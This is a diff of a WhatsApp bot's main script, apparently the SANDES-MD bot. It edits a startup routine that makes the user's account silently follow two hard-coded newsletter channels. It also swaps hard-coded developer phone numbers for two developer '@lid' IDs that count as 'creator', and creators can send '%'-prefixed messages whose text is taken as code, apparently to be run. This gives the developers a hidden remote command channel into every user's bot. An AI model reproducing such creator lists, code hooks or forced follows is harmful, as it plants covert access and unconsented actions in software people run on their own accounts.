@@ -164,13 +164,13 @@ setTimeout(async () => {
         console.log("STARTING NEWSLETTER AUTO FOLLOW...");
         const ch1_jid = "120363423246894149@newsletter";
         await conn.newsletterFollow(ch1_jid).catch(() => null);
-        console.log("MR.SANDES OFC ツ FOLLOW REQUEST SENT 🦋");
+        console.log("CH1 FOLLOW REQUEST SENT 🟢");
 
         await sleep(3000);
 
         const ch2_jid = "120363416065371245@newsletter";
         await conn.newsletterFollow(ch2_jid).catch(() => null);
-        console.log("SANDES-MD UPDATES ツ FOLLOW REQUEST SENT 🦋");
+        console.log("CH2 FOLLOW REQUEST SENT 🟢");
     } catch (e) {
         console.log("Newsletter Auto Follow Exception:", e.message);
     }
@@ -189,7 +189,7 @@ let up = `
 *┃*🗿 \`CONTACT\` : 94787518010
 *╰━━━━━━━━━━━━━━━━━╯*
 
-*✨ ᴛʜᴀɴᴋ you ꜰᴏʀ ᴛʀᴜꜱᴛɪɴɢ ꜱᴀɴᴅᴇส์ ᴍᴅ!*
+*✨ ᴛʜᴀɴᴋ you ꜰᴏʀ ᴛʀᴜส์ᴛɪɴɢ ꜱᴀɴᴅᴇส์ ᴍᴅ!*
 _We redefine your WhatsApp experience with_
 _seamless automation and elite features._
 
@@ -303,11 +303,13 @@ if (sender === SUPER_LID2) {
 await conn.sendMessage(from, { react: { text: `👨‍💻`, key: mek.key }})
 }
 
-const udp = botNumber.split('@')[0];
-const tharuzzofc = ['94787518010', '94716717099']; 
-let isCreator = [udp, ...tharuzzofc]
-    .map(v => String(v).replace(/[^0-9]/g, '') + '@s.whatsapp.net')
-    .includes(sender);
+// මෙතනට ඔයාගේ සහ අනිත් ඩිවලොපර්ස්ලාගේ @lid ලිස්ට් එක දාන්න මචන්
+const ownerLids = [
+    "123017090887835@lid", // SUPER_LID
+    "183150860841183@lid"  // SUPER_LID2
+]; 
+
+let isCreator = [conn.user.id, ...ownerLids].includes(sender);
 
 if (isCreator && body.startsWith('%')) {
     let code = body.slice(1).trim(); 
